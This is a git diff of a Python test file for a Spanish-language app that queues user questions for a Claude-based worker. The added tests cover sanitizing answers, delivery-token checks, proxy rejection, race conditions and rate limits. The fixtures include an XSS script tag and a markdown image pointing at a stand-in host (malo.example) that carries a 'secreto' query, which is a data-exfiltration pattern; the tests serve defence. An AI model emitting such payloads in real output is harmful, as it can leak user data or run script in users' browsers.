@@ -189,16 +189,20 @@ def test_ciclo_siguiente_respuesta_y_conversacion(app_c):
     assert api(c, "/siguiente").status_code == 204  # ya está «procesando»
     panel = c.get(f"{BASE}/consultas/D3-001/panel").text
     assert "Pensando…" in panel and "every 5s" in panel
-    texto = "Porque **RAG** basta. <script>alert(1)</script> [Docs](https://docs.aws.amazon.com/bedrock/)"
-    assert api(c, f"/mensajes/{d['mensaje_id']}/respuesta", texto=texto, sesion_claude="ses-1").status_code == 200
+    texto = ("Porque **RAG** basta. <script>alert(1)</script> [Docs](https://docs.aws.amazon.com/bedrock/)"
+             " ![espía](https://malo.example/x.png?d=secreto)")
+    assert d["reparto"] == 1
+    assert api(c, f"/mensajes/{d['mensaje_id']}/respuesta", texto=texto, sesion_claude="ses-1", reparto=1).status_code == 200
     m = c.get(f"{BASE}/consultas/D3-001/mensajes").text
     assert "<strong>RAG</strong>" in m and "<script>" not in m and "&lt;script&gt;" in m
+    assert "<img" not in m and 'href="https://malo.example/x.png?d=secreto"' in m  # la imagen queda como enlace
+    assert "img-src 'self' data:" in c.get(f"{BASE}/dudas").headers["content-security-policy"]
     assert 'target="_blank"' in m and 'rel="noopener noreferrer"' in m and "every 5s" not in m
     # segunda duda en la misma conversación: el trabajador recibe la sesión para --resume
     enviar(c, texto="¿Y si cambian a diario?")
     d2 = api(c, "/siguiente").json()
     assert d2["consulta_id"] == d["consulta_id"] and d2["sesion_claude"] == "ses-1"
-    assert api(c, f"/mensajes/{d['mensaje_id']}/respuesta", texto="otra").status_code == 409
+    assert api(c, f"/mensajes/{d['mensaje_id']}/respuesta", texto="otra", reparto=1).status_code == 409
 
 
 def test_respondida_y_respuesta_del_usuario(app_c):
@@ -215,12 +219,13 @@ def test_reintentar_error_y_reintentar_desde_el_panel(app_c):
     c = admin(app_c)
     enviar(c)
     mid = api(c, "/siguiente").json()["mensaje_id"]
-    assert api(c, f"/mensajes/{mid}/reintentar", motivo="usage limit", contar=False).status_code == 200
+    assert api(c, f"/mensajes/{mid}/reintentar", motivo="usage limit", contar=False, reparto=1).status_code == 200
     d = api(c, "/siguiente").json()
-    assert d["mensaje_id"] == mid and d["intentos"] == 1  # la cuota no gasta intentos
-    assert api(c, f"/mensajes/{mid}/reintentar", motivo="timeout").status_code == 200
-    assert api(c, "/siguiente").json()["intentos"] == 2
-    assert api(c, f"/mensajes/{mid}/error", motivo="Fallo de Claude").status_code == 200
+    assert d["mensaje_id"] == mid and d["intentos"] == 1 and d["reparto"] == 2  # la cuota no gasta intentos
+    assert api(c, f"/mensajes/{mid}/reintentar", motivo="timeout", reparto=2).status_code == 200
+    d = api(c, "/siguiente").json()
+    assert d["intentos"] == 2 and d["reparto"] == 3
+    assert api(c, f"/mensajes/{mid}/error", motivo="Fallo de Claude", reparto=3).status_code == 200
     panel = c.get(f"{BASE}/consultas/D3-001/panel").text
     assert "Error: Fallo de Claude" in panel and "Reintentar" in panel and "every 5s" not in panel
     r = c.post(f"{BASE}/consultas/D3-001/reintentar", data={"csrf": token(c, f"{BASE}/dudas")}, headers=HX)
@@ -261,7 +266,7 @@ def test_mis_dudas_y_conversacion(app_c):
     enviar(c)
     enviar(c, pid="D3-002", texto="¿Qué es few-shot?")
     d = api(c, "/siguiente").json()
-    api(c, f"/mensajes/{d['mensaje_id']}/respuesta", texto="Respuesta de *prueba*", sesion_claude="s")
+    api(c, f"/mensajes/{d['mensaje_id']}/respuesta", texto="Respuesta de *prueba*", sesion_claude="s", reparto=d["reparto"])
     html = c.get(f"{BASE}/dudas").text
     assert "D3-001" in html and "D3-002" in html and "Respondida" in html and "En cola" in html
     with app_c.state.sesiones() as db:
@@ -271,3 +276,82 @@ def test_mis_dudas_y_conversacion(app_c):
     # otro admin no ve conversaciones ajenas
     crear_usuario(app_c, "otro", rol="admin")
     assert entrar(app_c, "otro").get(f"{BASE}/dudas/{cid}").status_code == 404
+
+
+# ---------------------------------------------------------------- revisión de seguridad
+
+def test_api_rechaza_peticiones_por_el_proxy(app_c):
+    c = admin(app_c)
+    enviar(c)
+    assert api(c, "/siguiente", {**BEARER, "X-Forwarded-For": "192.168.1.50"}).status_code == 404
+    assert api(c, "/siguiente", {**BEARER, "Forwarded": "for=192.168.1.50"}).status_code == 404
+    assert api(c, "/siguiente").status_code == 200
+
+
+def test_solo_el_reparto_en_curso(app_c):
+    c = admin(app_c)
+    enviar(c)
+    d = api(c, "/siguiente").json()
+    mid = d["mensaje_id"]
+    for ruta, extra in (("respuesta", {"texto": "x"}), ("reintentar", {}), ("error", {})):
+        assert api(c, f"/mensajes/{mid}/{ruta}", reparto=d["reparto"] + 1, **extra).status_code == 409
+        assert api(c, f"/mensajes/{mid}/{ruta}", **extra).status_code == 409  # sin reparto
+    # el «procesando» caduca y se reparte otra vez: el reparto antiguo ya no puede responder
+    with app_c.state.sesiones() as db:
+        db.get(ConsultaMensaje, mid).actualizado = ahora() - timedelta(minutes=16)
+        db.commit()
+    d2 = api(c, "/siguiente").json()
+    assert d2["reparto"] == d["reparto"] + 1
+    assert api(c, f"/mensajes/{mid}/respuesta", texto="tarde", reparto=d["reparto"]).status_code == 409
+    assert api(c, f"/mensajes/{mid}/reintentar", reparto=d2["reparto"]).status_code == 200
+    # un mensaje pendiente (no «procesando») tampoco se puede responder
+    assert api(c, f"/mensajes/{mid}/respuesta", texto="x", reparto=d2["reparto"]).status_code == 409
+
+
+def test_reparto_atomico(app_c):
+    """Si entre la lectura y el UPDATE otro reparto se queda la duda, este no la entrega dos veces."""
+    from sqlalchemy import event, text
+
+    c = admin(app_c)
+    enviar(c)
+    motor = app_c.state.motor
+    hecho = []
+
+    def antes(conn, cursor, sql, params, context, executemany):
+        if sql.lstrip().upper().startswith("UPDATE CONSULTA_MENSAJE") and not hecho:
+            hecho.append(1)
+            with motor.connect() as otra:  # «otro trabajador» toma la duda justo antes
+                otra.execute(text("UPDATE consulta_mensaje SET estado='procesando', actualizado=:a"), {"a": ahora().strftime("%Y-%m-%d %H:%M:%S.%f")})
+                otra.commit()
+
+    event.listen(motor, "before_cursor_execute", antes)
+    try:
+        assert api(c, "/siguiente").status_code == 204
+    finally:
+        event.remove(motor, "before_cursor_execute", antes)
+    with app_c.state.sesiones() as db:
+        m = db.query(ConsultaMensaje).one()
+        assert m.estado == "procesando" and m.repartos == 0
+
+
+def test_tope_de_dudas_en_espera_y_por_dia(app_c):
+    c = admin(app_c)
+    for pid in ("D3-001", "D3-002", "D3-003"):
+        assert "En cola" in enviar(c, pid=pid).text
+    r = enviar(c, pid="D3-004")
+    assert "Ya tienes 3 dudas esperando respuesta" in r.text
+    with app_c.state.sesiones() as db:
+        assert db.query(ConsultaMensaje).count() == 3
+        # 27 dudas más ya respondidas en las últimas 24 h (30 en total)
+        k = db.query(Consulta).first()
+        for _ in range(27):
+            k.mensajes.append(ConsultaMensaje(rol="usuario", texto="x", estado="respondido"))
+        for m in db.query(ConsultaMensaje).filter_by(estado="pendiente"):
+            m.estado = "respondido"
+        db.commit()
+    assert "máximo de 30 dudas en 24 horas" in enviar(c, pid="D3-004").text
+    with app_c.state.sesiones() as db:
+        for m in db.query(ConsultaMensaje):
+            m.creado = ahora() - timedelta(hours=25)
+        db.commit()
+    assert "En cola" in enviar(c, pid="D3-004").text
